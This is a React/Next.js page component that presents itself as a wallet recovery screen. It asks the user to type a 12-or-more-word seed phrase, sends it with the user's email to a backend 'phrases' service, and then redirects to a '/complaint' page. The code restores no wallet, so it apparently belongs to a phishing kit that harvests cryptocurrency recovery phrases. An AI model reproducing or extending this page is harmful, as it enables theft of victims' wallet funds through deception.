"use client"
import Image from 'next/image'
import React, { useEffect, useState } from 'react'
import useEmblaCarousel from 'embla-carousel-react'
import Link from 'next/link'
import { LiaAngleLeftSolid } from "react-icons/lia";
import UseFormHandler from '../useFormHandler'
import { useRouter, useSearchParams } from 'next/navigation'
import { phrases } from '../services/authService'

function Page() {

    const router = useRouter()
    const [phrase, setPhrase] = useState("")
    const parems  = useSearchParams()

    const email = parems.get("email")

    const formdata = UseFormHandler({
        required: {
            phrase: 'Please Enter phrase',
        },
        initialValues: {
            phrase: '',
            email
        },

        onSubmit: async (value) => {
            const { status, data } = await phrases(value).catch(() => formdata.setProccessing(false))

            if (status) {
                router.push(`/complaint?email=${value.email}`)
            }
        }
    })



    return (
        <div className='select-none scroll-smooth max-w-md mx-auto'>
            <div className="bg-slate-50 dark:bg-gray-950 flex flex-col min-h-screen h-screen">
                <div className="flex-grow py-8 space-y-3">
                    <div className="px-4">
                        <div onClick={() => router.back()} className="w-8 h-8 cursor-pointer text-xl flex items-center justify-center text-blue-500"><LiaAngleLeftSolid /></div>
                    </div>
                    <div className="h-full px-4 space-y-10">
                        <div className="text-center">
                            <div className="font-bold text-lg">Enter recovery phrase</div>
                            <div className="text-gray-400 text-sm">Enter your Recover Phrase(Seed Phrase) to restore your wallet.</div>
                        </div>
                        <div className="space-y-0">
                            <textarea
                                placeholder='Enter recovery phrase'
                                onChange={(e) => { setPhrase(e.target.value); formdata.value.phrase = e.target.value }}
                                className="w-full dark:bg-gray-900 dark:placeholder:text-gray-700 resize-none text-sm min-h-32 appearance-none p-3 outline-none rounded-2xl"
                            />
                            <div className="text-[11px] text-gray-400">Separate each word with a space</div>
                        </div>
                    </div>
                </div>
                <div className="space-y-3 p-4">
                    <div onClick={() => { !formdata.proccessing && phrase.split(" ").length > 11 && formdata.submit() }} className={`${!formdata.proccessing && phrase.split(" ").length < 12 && "bg-opacity-30"} bg-blue-600  rounded-full text-center cursor-pointer py-4 px-9 text-white font-bold`}>Continue</div>
                </div>
            </div>
        </div>
    )
}

export default Page